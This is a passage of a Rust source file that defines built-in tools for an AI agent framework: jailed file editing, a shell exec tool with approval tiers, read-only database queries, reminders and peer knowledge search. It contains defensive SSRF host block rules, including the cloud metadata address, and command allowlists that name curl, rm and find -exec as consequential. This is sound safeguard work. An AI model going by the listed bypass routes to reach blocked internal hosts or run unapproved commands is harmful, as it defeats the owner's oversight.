//! Built-in tools. Each is a small struct; heavy shared logic lives in the
//! jail and the store.

use crate::{A2aTarget, Jail, Tool, ToolCx};
use revenant_core::home::Home;
use revenant_core::{PermissionTier, ToolOutput, ToolSpec};
use revenant_skills::SkillIndex;
use serde_json::{json, Value};
use std::sync::Arc;
use std::time::Duration;

/// Tool results larger than this are truncated in-context (full content
/// retrieval via ranges comes with `expand_result` in M2).
const MAX_RESULT_BYTES: usize = 8 * 1024;
/// Cap for a deliberate file read — far higher than the chat-output cap, since
/// the agent needs the WHOLE file to edit it. Only pathologically large files
/// get windowed (with offset/limit paging).
const READ_MAX_BYTES: usize = 256 * 1024;

/// A minimal file-editing toolset jailed to a single root — the Ascension
/// actuator uses this to let a coding agent edit an ephemeral git worktree
/// (and nothing outside it). No `exec` on purpose: builds/tests are run by the
/// orchestration out-of-band, so the agent can't spend fuel or trip approval
/// prompts on `cargo`, and can't reach anything beyond `root`.
pub fn coder(root: &std::path::Path) -> Vec<Arc<dyn Tool>> {
    let jail = Jail::new(vec![root.to_path_buf()]);
    vec![
        Arc::new(ReadFile { jail: jail.clone() }),
        Arc::new(WriteFile { jail: jail.clone() }),
        Arc::new(EditFile { jail: jail.clone() }),
        Arc::new(ListDir { jail }),
    ]
}

pub fn all(home: &Home, skills: Arc<SkillIndex>) -> Vec<Arc<dyn Tool>> {
    let read_jail = Jail::new(vec![home.workspace_dir(), home.skills_dir()]);
    let write_jail = Jail::new(vec![home.workspace_dir()]);
    vec![
        Arc::new(ReadFile { jail: read_jail.clone() }),
        Arc::new(WriteFile { jail: write_jail.clone() }),
        Arc::new(EditFile { jail: write_jail.clone() }),
        Arc::new(ListDir { jail: read_jail.clone() }),
        Arc::new(Exec { workspace: home.workspace_dir() }),
        Arc::new(DbQuery),
        Arc::new(Reminder),
        Arc::new(Recall),
        Arc::new(MemorySave),
        Arc::new(MemoryRead { home: home.clone() }),
        Arc::new(MemoryAppend { home: home.clone() }),
        Arc::new(UseSkill { skills: skills.clone() }),
        Arc::new(FindSkill { skills: skills.clone() }),
        Arc::new(ReadSkillFile { skills: skills.clone() }),
        Arc::new(SkillWrite { skills: skills.clone() }),
        Arc::new(LoopCreate),
        Arc::new(LoopControl),
        Arc::new(LoopUpdate),
        Arc::new(WebSearch { http: web_client() }),
        Arc::new(WebFetch { http: web_client() }),
        Arc::new(NetPublish { home: home.clone() }),
        Arc::new(ConsultCodex { home: home.clone() }),
        Arc::new(QuestPost { home: home.clone() }),
        Arc::new(QuestBoard { home: home.clone() }),
        Arc::new(QuestClaim { home: home.clone() }),
        Arc::new(QuestSolve { home: home.clone() }),
        Arc::new(QuestAccept { home: home.clone() }),
        Arc::new(QuestClose { home: home.clone() }),
        Arc::new(QuestVouch { home: home.clone() }),
        Arc::new(QuestBoost { home: home.clone() }),
        Arc::new(SkillBrowse { home: home.clone(), skills: skills.clone() }),
        Arc::new(SkillAdopt { home: home.clone(), skills: skills.clone() }),
        Arc::new(CodeTask { home: home.clone() }),
    ]
}

/// A browser-ish HTTP client for the web tools: real UA, bounded timeouts,
/// redirects followed. Shared shape so search + fetch behave consistently.
fn web_client() -> reqwest::Client {
    // Redirect policy is part of the SSRF defence: a public URL must not be
    // able to bounce the fetch to an internal target via 30x.
    let redirect = reqwest::redirect::Policy::custom(|attempt| {
        if attempt.previous().len() > 8 {
            return attempt.stop();
        }
        match attempt.url().host_str() {
            Some(h) if host_blocked(h) => attempt.error("redirect to a blocked (internal) host"),
            _ => attempt.follow(),
        }
    });
    reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (compatible; revenant/1.0; +https://revenant.ai)")
        .timeout(Duration::from_secs(25))
        .connect_timeout(Duration::from_secs(10))
        .redirect(redirect)
        .build()
        .unwrap_or_default()
}

/// True if a host string is an internal/reserved target the web tools must
/// never reach (SSRF guard): loopback, private ranges, link-local (incl. the
/// 169.254.169.254 cloud-metadata endpoint), and internal naming suffixes.
fn host_blocked(host: &str) -> bool {
    let h = host.trim_start_matches('[').trim_end_matches(']');
    if h.eq_ignore_ascii_case("localhost")
        || h.ends_with(".local")
        || h.ends_with(".internal")
        || h.ends_with(".lan")
    {
        return true;
    }
    if let Ok(ip) = h.parse::<std::net::IpAddr>() {
        return ip_blocked(&ip);
    }
    false
}

fn ip_blocked(ip: &std::net::IpAddr) -> bool {
    use std::net::IpAddr;
    match ip {
        IpAddr::V4(v4) => {
            v4.is_loopback()
                || v4.is_private()
                || v4.is_link_local() // 169.254.0.0/16 — incl. 169.254.169.254 metadata
                || v4.is_unspecified()
                || v4.is_broadcast()
                || v4.octets()[0] == 0
                // Carrier-grade NAT 100.64.0.0/10
                || (v4.octets()[0] == 100 && (64..=127).contains(&v4.octets()[1]))
        }
        IpAddr::V6(v6) => {
            v6.is_loopback()
                || v6.is_unspecified()
                || (v6.segments()[0] & 0xfe00) == 0xfc00 // unique-local fc00::/7
                || (v6.segments()[0] & 0xffc0) == 0xfe80 // link-local fe80::/10
        }
    }
}

/// Validate a fetch target: reject internal hosts, resolving DNS so a public
/// name that points at a private IP is caught too. Returns Err(reason) if the
/// URL must not be fetched.
async fn ssrf_check(url: &str) -> std::result::Result<(), String> {
    let parsed = reqwest::Url::parse(url).map_err(|e| format!("bad url: {e}"))?;
    match parsed.scheme() {
        "http" | "https" => {}
        s => return Err(format!("scheme {s:?} not allowed")),
    }
    let host = parsed.host_str().ok_or_else(|| "url has no host".to_string())?;
    if host_blocked(host) {
        return Err(format!("host {host:?} is internal/reserved — refusing (SSRF guard)"));
    }
    // Resolve and reject if ANY address is internal (defends DNS-based SSRF).
    let port = parsed.port_or_known_default().unwrap_or(80);
    if let Ok(addrs) = tokio::net::lookup_host((host, port)).await {
        for a in addrs {
            if ip_blocked(&a.ip()) {
                return Err(format!("host {host:?} resolves to an internal address — refusing"));
            }
        }
    }
    Ok(())
}

fn truncate_result(mut s: String) -> String {
    if s.len() <= MAX_RESULT_BYTES {
        return s;
    }
    let total = s.len();
    let mut end = MAX_RESULT_BYTES;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    s.truncate(end);
    s.push_str(&format!("\n…[truncated: {total} bytes total]"));
    s
}

fn arg_str<'a>(args: &'a Value, key: &str) -> Result<&'a str, ToolOutput> {
    args.get(key)
        .and_then(|v| v.as_str())
        .ok_or_else(|| ToolOutput::err(format!("missing required string arg '{key}'")))
}

macro_rules! spec {
    ($name:expr, $desc:expr, $schema:expr) => {
        ToolSpec { name: $name.into(), description: $desc.into(), input_schema: $schema }
    };
}

// ---- fs ----

struct ReadFile {
    jail: Jail,
}

#[async_trait::async_trait]
impl Tool for ReadFile {
    fn spec(&self) -> ToolSpec {
        spec!(
            "read_file",
            "Read a file. Returns the WHOLE file by default (up to ~256KB) — essential for editing safely. For a bigger file, page it with `offset` (1-based start line) and `limit` (max lines); the response reports the total line count so you know how much remains.",
            json!({"type":"object","properties":{
                "path":{"type":"string"},
                "offset":{"type":"integer","description":"1-based start line (default 1)"},
                "limit":{"type":"integer","description":"max lines to return (default: to end of file)"}
            },"required":["path"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::ReadOnly
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let path = match arg_str(&args, "path") {
            Ok(p) => p,
            Err(e) => return e,
        };
        let content = match self.jail.resolve_read(path).and_then(|p| Ok(std::fs::read_to_string(p)?)) {
            Ok(c) => c,
            Err(err) => return ToolOutput::err(format!("{err:#}")),
        };
        // A file read returns the FILE — not the 8KB chat-output cap. Truncating
        // a file the agent means to edit is how you get hallucinated diffs.
        let lines: Vec<&str> = content.lines().collect();
        let total = lines.len();
        let offset = args.get("offset").and_then(|v| v.as_u64()).unwrap_or(1).max(1) as usize;
        let limit = args.get("limit").and_then(|v| v.as_u64()).map(|n| n as usize);
        let start = (offset - 1).min(total);
        let mut end = limit.map_or(total, |l| (start + l).min(total));
        let mut body = lines[start..end].join("\n");
        // Guard against a pathologically huge window blowing the context.
        let mut byte_capped = false;
        if body.len() > READ_MAX_BYTES {
            let mut cut = READ_MAX_BYTES;
            while cut > 0 && !body.is_char_boundary(cut) {
                cut -= 1;
            }
            body.truncate(cut);
            // Recompute how many whole lines actually made it in.
            end = start + body.lines().count();
            byte_capped = true;
        }
        let windowed = start > 0 || end < total || byte_capped;
        if windowed {
            ToolOutput::ok(format!(
                "[read_file {path}: lines {}–{} of {total}{}. {}]\n{body}",
                start + 1,
                end,
                if byte_capped { " (byte-capped)" } else { "" },
                if end < total { format!("Pass offset={} to read more.", end + 1) } else { "End of file.".into() },
            ))
        } else {
            ToolOutput::ok(body)
        }
    }
}

struct WriteFile {
    jail: Jail,
}

#[async_trait::async_trait]
impl Tool for WriteFile {
    fn spec(&self) -> ToolSpec {
        spec!(
            "write_file",
            "Write a file inside the workspace. Creates parent directories. Overwrites existing content.",
            json!({"type":"object","properties":{"path":{"type":"string"},"content":{"type":"string"}},"required":["path","content"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::WriteWorkspace
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let (path, content) = match (arg_str(&args, "path"), arg_str(&args, "content")) {
            (Ok(p), Ok(c)) => (p, c),
            (Err(e), _) | (_, Err(e)) => return e,
        };
        match self.jail.resolve_write(path).and_then(|p| {
            std::fs::write(&p, content)?;
            Ok(p)
        }) {
            Ok(p) => ToolOutput::ok(format!("wrote {} bytes to {}", content.len(), p.display())),
            Err(err) => ToolOutput::err(format!("{err:#}")),
        }
    }
}

/// Surgical string-replace edit — the ONLY way to change a large file. A
/// whole-file `write_file` requires the model to re-emit the entire file as its
/// argument, which blows the output-token limit on big files (the file reads
/// fine, but the edit gets truncated to nothing). `edit_file` emits only the
/// changed region, so file size no longer bounds what can be edited.
struct EditFile {
    jail: Jail,
}

#[async_trait::async_trait]
impl Tool for EditFile {
    fn spec(&self) -> ToolSpec {
        spec!(
            "edit_file",
            "Edit an existing file by replacing an exact string — prefer this over write_file for anything but tiny/new files (write_file re-emits the whole file and hits the output limit on large ones). `old_string` must occur EXACTLY ONCE — include enough surrounding lines to make it unique — and is replaced by `new_string`. Set replace_all=true to change every occurrence. Copy `old_string` verbatim from read_file, whitespace included.",
            json!({"type":"object","properties":{
                "path":{"type":"string"},
                "old_string":{"type":"string","description":"exact text to find (unique unless replace_all)"},
                "new_string":{"type":"string","description":"replacement text"},
                "replace_all":{"type":"boolean","description":"replace every occurrence (default false)"}
            },"required":["path","old_string","new_string"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::WriteWorkspace
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let (path, old, new) = match (
            arg_str(&args, "path"),
            arg_str(&args, "old_string"),
            arg_str(&args, "new_string"),
        ) {
            (Ok(p), Ok(o), Ok(n)) => (p, o, n),
            (Err(e), ..) | (_, Err(e), _) | (_, _, Err(e)) => return e,
        };
        if old == new {
            return ToolOutput::err("old_string and new_string are identical — nothing to do");
        }
        let replace_all = args.get("replace_all").and_then(|v| v.as_bool()).unwrap_or(false);
        let content = match self.jail.resolve_read(path).and_then(|p| Ok(std::fs::read_to_string(p)?)) {
            Ok(c) => c,
            Err(err) => return ToolOutput::err(format!("{err:#}")),
        };
        let count = content.matches(old).count();
        if count == 0 {
            return ToolOutput::err(format!(
                "old_string not found in {path} — read_file it and copy the exact text (whitespace included)."
            ));
        }
        if count > 1 && !replace_all {
            return ToolOutput::err(format!(
                "old_string appears {count}× in {path} — add surrounding context to make it unique, or set replace_all=true."
            ));
        }
        let updated = if replace_all { content.replace(old, new) } else { content.replacen(old, new, 1) };
        let n = if replace_all { count } else { 1 };
        match self.jail.resolve_write(path).and_then(|p| {
            std::fs::write(&p, &updated)?;
            Ok(p)
        }) {
            Ok(p) => ToolOutput::ok(format!(
                "edited {} — {n} replacement{}, now {} bytes",
                p.display(),
                if n == 1 { "" } else { "s" },
                updated.len()
            )),
            Err(err) => ToolOutput::err(format!("{err:#}")),
        }
    }
}

struct ListDir {
    jail: Jail,
}

#[async_trait::async_trait]
impl Tool for ListDir {
    fn spec(&self) -> ToolSpec {
        spec!(
            "list_dir",
            "List a directory in the workspace or skills dir. Defaults to the workspace root.",
            json!({"type":"object","properties":{"path":{"type":"string"}}})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::ReadOnly
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let path = args.get("path").and_then(|v| v.as_str()).unwrap_or(".");
        let dir = match self.jail.resolve_read(path) {
            Ok(d) => d,
            Err(err) => return ToolOutput::err(format!("{err:#}")),
        };
        match std::fs::read_dir(&dir) {
            Ok(entries) => {
                let mut lines: Vec<String> = entries
                    .filter_map(|e| e.ok())
                    .map(|e| {
                        let suffix = if e.path().is_dir() { "/" } else { "" };
                        format!("{}{}", e.file_name().to_string_lossy(), suffix)
                    })
                    .collect();
                lines.sort();
                ToolOutput::ok(truncate_result(lines.join("\n")))
            }
            Err(err) => ToolOutput::err(format!("reading {}: {err}", dir.display())),
        }
    }
}

// ---- exec ----

struct Exec {
    workspace: std::path::PathBuf,
}

#[async_trait::async_trait]
impl Tool for Exec {
    fn spec(&self) -> ToolSpec {
        spec!(
            "exec",
            "Run a shell command in the workspace (60s timeout, output capped). Routine read-only commands (ls, cat, grep, git status/log/diff, …) run without approval; anything that mutates, deletes, sends, or reaches out prompts the owner. To read your own state DB use `db_query` (no approval); don't shell out to sqlite3.",
            json!({"type":"object","properties":{"command":{"type":"string"}},"required":["command"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Dangerous
    }
    fn risk(&self, input: &Value) -> PermissionTier {
        match input.get("command").and_then(|v| v.as_str()) {
            // A safe, read-only invocation is routine — no prompt.
            Some(cmd) if exec_is_read_only(cmd) => PermissionTier::ReadOnly,
            // Everything else (mutating, outbound, chained, unknown) prompts.
            _ => PermissionTier::Dangerous,
        }
    }
    async fn invoke(&self, _cx: &ToolCx, args: Value) -> ToolOutput {
        let command = match arg_str(&args, "command") {
            Ok(c) => c,
            Err(e) => return e,
        };
        let child = tokio::process::Command::new("/bin/sh")
            .arg("-c")
            .arg(command)
            .current_dir(&self.workspace)
            .env_clear()
            .env("PATH", "/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:/opt/homebrew/bin")
            .env("HOME", &self.workspace)
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true)
            .spawn();
        let child = match child {
            Ok(c) => c,
            Err(err) => return ToolOutput::err(format!("spawn failed: {err}")),
        };
        match tokio::time::timeout(Duration::from_secs(60), child.wait_with_output()).await {
            Err(_) => ToolOutput::err("command timed out after 60s (killed)".to_string()),
            Ok(Err(err)) => ToolOutput::err(format!("exec error: {err}")),
            Ok(Ok(output)) => {
                let mut text = String::new();
                text.push_str(&String::from_utf8_lossy(&output.stdout));
                if !output.stderr.is_empty() {
                    text.push_str("\n[stderr]\n");
                    text.push_str(&String::from_utf8_lossy(&output.stderr));
                }
                let status = output.status.code().unwrap_or(-1);
                let body = truncate_result(text);
                if output.status.success() {
                    ToolOutput::ok(body)
                } else {
                    ToolOutput::err(format!("exit code {status}\n{body}"))
                }
            }
        }
    }
}

// ---- db_query: read-only introspection of the agent's own state ----

/// Read-only SQL over revenant's own SQLite store (sessions, messages, spend,
/// jobs, loops, memory index…). ReadOnly tier → never needs owner approval:
/// reading your own state is safe, and the query is refused unless SQLite
/// itself reports it as read-only (so no INSERT/UPDATE/DELETE/DDL can slip in).
/// This is the sanctioned way to "check the DB" — don't shell out to `sqlite3`.
struct DbQuery;

#[async_trait::async_trait]
impl Tool for DbQuery {
    fn spec(&self) -> ToolSpec {
        spec!(
            "db_query",
            "Run a READ-ONLY SQL query (SELECT/PRAGMA/EXPLAIN) against your own revenant state DB — sessions, messages, spend, jobs, loops, memory index. Returns rows as JSON (capped). No approval needed. Use this instead of shelling out to sqlite3.",
            json!({"type":"object","properties":{"sql":{"type":"string","description":"a single read-only statement"}},"required":["sql"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::ReadOnly
    }
    async fn invoke(&self, cx: &ToolCx, args: Value) -> ToolOutput {
        let sql = match arg_str(&args, "sql") {
            Ok(s) => s.to_string(),
            Err(e) => return e,
        };
        const MAX_ROWS: usize = 500;
        let outcome = cx
            .store
            .with(move |conn| {
                let mut stmt = match conn.prepare(&sql) {
                    Ok(s) => s,
                    Err(e) => return Ok(Err(format!("SQL error: {e}"))),
                };
                // The hard guarantee: only queries SQLite classifies as
                // read-only run. No parsing heuristics to fool.
                if !stmt.readonly() {
                    return Ok(Err(
                        "refused: only read-only queries (SELECT / PRAGMA / EXPLAIN) are allowed"
                            .to_string(),
                    ));
                }
                let cols: Vec<String> =
                    stmt.column_names().into_iter().map(String::from).collect();
                let ncol = cols.len();
                let mut rows_out: Vec<serde_json::Value> = Vec::new();
                let mut truncated = false;
                let mut rows = stmt.query([])?;
                while let Some(row) = rows.next()? {
                    if rows_out.len() >= MAX_ROWS {
                        truncated = true;
                        break;
                    }
                    let mut obj = serde_json::Map::new();
                    for (i, name) in cols.iter().enumerate().take(ncol) {
                        let v = match row.get_ref(i)? {
                            rusqlite::types::ValueRef::Null => serde_json::Value::Null,
                            rusqlite::types::ValueRef::Integer(n) => serde_json::json!(n),
                            rusqlite::types::ValueRef::Real(f) => serde_json::json!(f),
                            rusqlite::types::ValueRef::Text(t) => {
                                serde_json::Value::String(String::from_utf8_lossy(t).into_owned())
                            }
                            rusqlite::types::ValueRef::Blob(b) => {
                                serde_json::json!(format!("<blob {} bytes>", b.len()))
                            }
                        };
                        obj.insert(name.clone(), v);
                    }
                    rows_out.push(serde_json::Value::Object(obj));
                }
                Ok(Ok((rows_out, truncated)))
            })
            .await;
        match outcome {
            Ok(Ok((rows, truncated))) => {
                let mut body = serde_json::to_string_pretty(&rows)
                    .unwrap_or_else(|_| "[]".to_string());
                if truncated {
                    body.push_str(&format!("\n… (capped at {MAX_ROWS} rows)"));
                }
                ToolOutput::ok(truncate_result(body))
            }
            Ok(Err(msg)) => ToolOutput::err(msg),
            Err(e) => ToolOutput::err(format!("db_query failed: {e:#}")),
        }
    }
}

/// Conservatively decide whether a shell command is a safe, read-only
/// invocation that shouldn't need approval. Deliberately strict: anything with
/// shell chaining, redirection, or substitution (which could hide a mutation),
/// or any program not on the read-only allowlist, returns false → prompt. The
/// common routine cases (`ls`, `cat foo`, `git status`, `grep x`) pass; the
/// consequential ones (rm, mv, curl, mail, installs, `>`) do not.
fn exec_is_read_only(command: &str) -> bool {
    // Strip trailing benign output redirections (silencing stderr/stdout doesn't
    // mutate anything) before the operator scan, so `… 2>&1` stays routine.
    let mut cmd = command.trim().to_string();
    loop {
        let trimmed = cmd.trim_end();
        let stripped = ["2>&1", "2>/dev/null", "&>/dev/null", ">/dev/null"]
            .iter()
            .find_map(|s| trimmed.strip_suffix(s));
        match stripped {
            Some(pre) => cmd = pre.trim_end().to_string(),
            None => break,
        }
    }
    let cmd = cmd.trim();
    if cmd.is_empty() {
        return false;
    }
    // Any operator that could chain, redirect, or substitute a command → not
    // auto-safe. Scan the SHELL-VISIBLE text (quoted spans removed), so a `;` or
    // `|` inside a quoted argument — e.g. a SQL string — doesn't disqualify,
    // while active command substitution (`$(…)`/backtick), even inside double
    // quotes, still does. (Plain `$VAR` is fine.)
    let (visible, saw_subst) = shell_visible(cmd);
    if saw_subst
        || visible.contains(['|', '&', ';', '>', '<', '`', '\n'])
        || visible.contains("$(")
    {
        return false;
    }
    // Skip leading `VAR=val` environment-assignment prefixes (e.g.
    // `HOME=/x revenant …`) to reach the actual program.
    let mut parts = cmd.split_whitespace().peekable();
    while let Some(tok) = parts.peek() {
        let is_assign = !tok.starts_with(['/', '-'])
            && tok.split_once('=').is_some_and(|(k, _)| {
                !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
            });
        if is_assign {
            parts.next();
        } else {
            break;
        }
    }
    let Some(prog0) = parts.next() else { return false };
    let prog = prog0.rsplit('/').next().unwrap_or(prog0); // basename
    let rest: Vec<&str> = parts.collect();
    // git: only read-only subcommands (config/stash/tag/etc. can mutate).
    if prog == "git" {
        return matches!(
            rest.first().copied().unwrap_or(""),
            "status" | "log" | "diff" | "show" | "branch" | "remote" | "rev-parse"
                | "describe" | "blame" | "ls-files" | "shortlog" | "whatchanged"
        );
    }
    // `find` is read-only only without action flags that mutate/execute.
    if prog == "find" {
        return !cmd.contains("-delete") && !cmd.contains("-exec") && !cmd.contains("-execdir");
    }
    // `revenant …`: only its read-only subcommands (the querying half of `net`,
    // memory reads, doctor, version) — the mutating verbs still prompt.
    if prog == "revenant" {
        return revenant_is_read_only(&rest);
    }
    // `sqlite3 <db> "<sql>"`: safe when the SQL only reads.
    if prog == "sqlite3" {
        return sqlite_is_read_only(cmd);
    }
    const READ_ONLY: &[&str] = &[
        "ls", "cat", "head", "tail", "wc", "stat", "file", "grep", "rg", "fd", "tree", "du",
        "df", "pwd", "echo", "printf", "date", "whoami", "id", "uname", "hostname", "uptime",
        "env", "which", "ps", "true", "basename", "dirname", "realpath", "readlink", "cksum",
        "sha256sum", "md5sum", "sort", "uniq", "cut", "column", "nl", "seq", "jq",
    ];
    READ_ONLY.contains(&prog)
}

/// The shell-visible text of a command with quoted spans removed, plus whether
/// active command substitution (`$(…)` or a backtick) appears outside single
/// quotes. Single quotes are fully literal; inside double quotes `;|<>&` are
/// literal but `$()`/backtick still expand — so we drop quoted characters from
/// the operator scan yet flag substitution wherever it's live.
fn shell_visible(s: &str) -> (String, bool) {
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::new();
    let mut subst = false;
    let mut quote: Option<char> = None;
    let mut i = 0;
    while i < chars.len() {
        let c = chars[i];
        match quote {
            Some('\'') => {
                if c == '\'' {
                    quote = None;
                }
            }
            Some('"') => {
                if c == '"' {
                    quote = None;
                } else if c == '`' || (c == '$' && chars.get(i + 1) == Some(&'(')) {
                    subst = true;
                }
            }
            _ => {
                if c == '\'' || c == '"' {
                    quote = Some(c);
                } else {
                    out.push(c);
                }
            }
        }
        i += 1;
    }
    (out, subst)
}

/// Read-only `revenant` invocations — the querying subcommands that never write
/// or reach out to mutate. Mutating verbs (net scroll/vote/quest/claim/solve/…,
/// up, ascend, signup/bind) are absent, so they still prompt.
fn revenant_is_read_only(rest: &[&str]) -> bool {
    match rest.first().copied().unwrap_or("") {
        "doctor" | "version" | "--version" | "-V" | "--help" | "-h" | "help" => true,
        "memory" => matches!(rest.get(1).copied().unwrap_or(""), "search" | "status"),
        "net" => matches!(
            rest.get(1).copied().unwrap_or(""),
            "peers" | "id" | "feed" | "search" | "replies" | "reproductions" | "list"
                | "quests" | "credits" | "reputation" | "rep"
        ),
        _ => false,
    }
}

/// Is a `sqlite3` command read-only — a SELECT or read-only dot/PRAGMA, with no
/// statement that could write? Conservative: any write keyword disqualifies.
fn sqlite_is_read_only(cmd: &str) -> bool {
    let lc = cmd.to_lowercase();
    const WRITES: &[&str] = &[
        "insert", "update", "delete", "drop", "create", "alter", "replace", "attach",
        "detach", "vacuum", "reindex", "truncate", ".import", ".restore", ".clone",
    ];
    if WRITES.iter().any(|w| lc.contains(w)) {
        return false;
    }
    lc.contains("select") || lc.contains(".tables") || lc.contains(".schema") || lc.contains("pragma")
}

// ---- reminders & timers ----

/// Set a one-shot reminder/timer: deliver `message` to the owner after
/// `delay_seconds`. Backed by a durable job (`run_after` = due time), so it
/// fires ONCE at the right time, survives restarts, and needs NO approval —
/// setting a timer is benign. This is the ONLY correct way to do "remind me in
/// X": do not use loop_create (those are recurring) or exec.
struct Reminder;

#[async_trait::async_trait]
impl Tool for Reminder {
    fn spec(&self) -> ToolSpec {
        spec!(
            "reminder",
            "Remind the owner of something after a delay (a one-shot timer). Give the message and delay_seconds (e.g. '15 minutes' = 900). Fires exactly once at that time and delivers to the owner's channel. Use this for any 'remind me in X' / 'set a timer' request — never loop_create (recurring) or exec.",
            json!({"type":"object","properties":{
                "message":{"type":"string","description":"what to remind the owner (phrase it as the reminder text)"},
                "delay_seconds":{"type":"integer","description":"seconds from now to fire (e.g. 15 minutes = 900)"}
            },"required":["message","delay_seconds"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::WriteWorkspace
    }
    async fn invoke(&self, cx: &ToolCx, args: Value) -> ToolOutput {
        let message = match arg_str(&args, "message") {
            Ok(m) => m.to_string(),
            Err(e) => return e,
        };
        let delay = match args.get("delay_seconds").and_then(|v| v.as_i64()) {
            Some(d) => d.clamp(1, 60 * 60 * 24 * 30), // 1s … 30d
            None => return ToolOutput::err("delay_seconds must be an integer number of seconds"),
        };
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_secs() as i64)
            .unwrap_or(0);
        let payload = json!({ "message": message }).to_string();
        // A reminder that can't be enqueued is worth surfacing; a couple of
        // retries covers a transient store hiccup without spamming.
        if let Err(e) = cx.store.job_enqueue("reminder", &payload, "reminder", 3, now + delay).await {
            return ToolOutput::err(format!("couldn't set the reminder: {e:#}"));
        }
        ToolOutput::ok(format!("⏰ Reminder set for {} from now: {message}", human_delay(delay)))
    }
}

/// "900" → "15m", "90" → "1m30s", "7200" → "2h". Compact, for the confirmation.
fn human_delay(secs: i64) -> String {
    let (h, m, s) = (secs / 3600, (secs % 3600) / 60, secs % 60);
    let mut out = String::new();
    if h > 0 {
        out.push_str(&format!("{h}h"));
    }
    if m > 0 {
        out.push_str(&format!("{m}m"));
    }
    if s > 0 && h == 0 {
        out.push_str(&format!("{s}s"));
    }
    if out.is_empty() {
        out.push_str("0s");
    }
    out
}

// ---- the codex: learn from the horde ----

/// Search the shared Vault (the horde's codex of scrolls + molts) for prior
/// knowledge relevant to what this agent is doing — so it learns from peers
/// before acting. Keyword search on the Necropolis, then (if this agent has an
/// embedder) a local semantic re-rank so the most relevant scroll floats up.
struct ConsultCodex {
    home: Home,
}

#[async_trait::async_trait]
impl Tool for ConsultCodex {
    fn spec(&self) -> ToolSpec {
        spec!(
            "consult_codex",
            "Search the horde's shared codex — the Vault of signed Scrolls (what other revenants did, with proof) and published artifacts — for prior knowledge relevant to your current task. Use it BEFORE solving something from scratch: another revenant may have already done it, proven it, and left actionable notes. Returns the most relevant scrolls (semantically ranked) and related molts/skills you can adopt.",
            json!({"type":"object","properties":{
                "query":{"type":"string","description":"what you're trying to do / learn (natural language)"},
                "limit":{"type":"integer","description":"max scrolls to return (default 5)"}
            },"required":["query"]})
        )
    }
    fn permission(&self) -> PermissionTier {
        PermissionTier::Network
    }
    async fn invoke(&self, cx: &ToolCx, args: Value) -> ToolOutput {
        let query = match arg_str(&args, "query") {
            Ok(q) => q.to_string(),
            Err(e) => return e,
        };
        let limit = args.get("limit").and_then(|v| v.as_u64()).unwrap_or(5).clamp(1, 15) as usize;
        let url = std::fs::read_to_string(self.home.config_path())
            .ok()
            .and_then(|s| revenant_core::config::Config::from_toml(&s).ok())
            .and_then(|c| c.network.necropolis_url);
        let Some(url) = url else {
            return ToolOutput::err("no horde configured (set network.necropolis_url) — can't consult the codex");
        };
        let client = revenant_net::NecropolisClient::new(url);
        let res = match client.search(&query).await {
            Ok(r) => r,
            Err(e) => return ToolOutput::err(format!("codex search failed: {e:#}")),
        };
        let mut scrolls = res.scrolls;
        if scrolls.is_empty() && res.artifacts.is_empty() {
            return ToolOutput::ok(format!("The codex has nothing on \"{query}\" yet — you may be first."));
        }
        // Semantic re-rank the scrolls if this agent has an embedder (memory on).
        if let Some(mem) = &cx.memory {
            if scrolls.len() > 1 {
                let mut texts = Vec::with_capacity(scrolls.len() + 1);
                texts.push(query.clone());
                texts.extend(scrolls.iter().map(|s| s.body.clone()));
                if let Ok(embs) = mem.embed(&texts) {
                    if embs.len() == texts.len() {
                        let q = embs[0].clone();
                        let mut order: Vec<usize> = (0..scrolls.len()).collect();
                        order.sort_by(|&a, &b| {
                            cosine(&q, &embs[b + 1])
                                .partial_cmp(&cosine(&q, &embs[a + 1]))
                                .unwrap_or(std::cmp::Ordering::Equal)
                        });
                        scrolls = order.into_iter().map(|i| scrolls[i].clone()).collect();
                    }
                }
            }
        }
        let mut out = format!("🜁 Codex — what the horde already knows about \"{query}\":\n");
        for s in scrolls.iter().take(limit) {
            let tome = s.tome.as_deref().map(|t| format!(" · tome:{t}")).unwrap_or_default();
            let sig = if s.sigils.is_empty() { String::new() } else { format!(" · sigils:{}", s.sigils.join(",")) };
            out.push_str(&format!("\n📜 {}{tome}{sig}\n{}\n", &s.author[..8.min(s.author.len())], s.body.trim()));
            if !s.refs.is_empty() {
                out.push_str(&format!("   backed by molt(s): {}\n", s.refs.join(", ")));
            }
        }
        if !res.artifacts.is_empty() {
            out.push_str("\nrelated artifacts — adopt with `net adopt <id>`:\n");
            for a in res.artifacts.iter().take(limit) {
                let id = a["id"].as_str().unwrap_or("");
                out.push_str(&format!(
                    "• {} [{}] {}\n",
                    &id[..12.min(id.len())],
                    a["kind"].as_str().unwrap_or("?"),
                    a["title"].as_str().unwrap_or("")
                ));
            }
        }
        ToolOutput::ok(out)
    }
}

/// Cosine similarity of two equal-length embedding vectors.
fn cosine(a: &[f32], b: &[f32]) -> f32 {
    let (mut dot, mut na, mut nb) = (0f32, 0f32, 0f32);
    for i in 0..a.len().min(b.len()) {
        dot += a[i] * b[i];
        na += a[i] * a[i];
        nb += b[i] * b[i];
    }
    if na == 0.0 || nb == 0.0 {
        return 0.0;
    }
    dot / (na.sqrt() * nb.sqrt())
}

// ---- memory & recall ----

struct Recall;

#[async_trait::async_trait]
impl Tool for Recall {
